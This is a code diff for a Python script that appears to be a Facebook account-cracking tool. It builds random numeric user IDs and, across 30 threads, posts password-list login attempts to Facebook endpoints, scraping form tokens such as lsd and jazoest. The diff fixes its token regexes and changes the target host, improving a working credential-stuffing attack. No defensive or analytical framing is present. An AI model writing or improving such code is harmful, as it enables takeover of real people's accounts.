@@ -101,7 +101,7 @@ def rndm():
         linex()
         sumon=input(f'{K}\x1b[1;92m SELECT METHOD : ')
         for __BLACK__ in range(limit):
-                _Xx_ = ''.join(random.choice(string.digits) for _ in range(8))
+                _Xx_ = ''.join(random.choice(string.digits) for _ in range(6))
                 user.append(_Xx_)
         with tred(max_workers=30) as _BLACK_:
                 tl = str(len(user))
@@ -133,10 +133,10 @@ def _M1_(ids,pasx):
                 for ps in pasx:
                         session = requests.Session()
                         pro = random.choice(ugen)
-                        BLACKX = session.get('https://m.facebook.com').text
+                        BLACKX = session.get('https://x.prod.facebook.com/').text
                         apple = {
-                        "m_ts": re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        "li": re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(BLACKX)).group(1),
+                        "li": re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
                         "try_number": 0,
                         "unrecognized_tries": 0,
                         "email": ids,
@@ -152,7 +152,7 @@ def _M1_(ids,pasx):
                         "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                         "bi_wvdp": "",
                         "fb_dtsg": "",
-                        "jazoest": re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+                        "jazoest": re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
                         "lsd": re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
                         "dyn": "",
                         "csr": "",
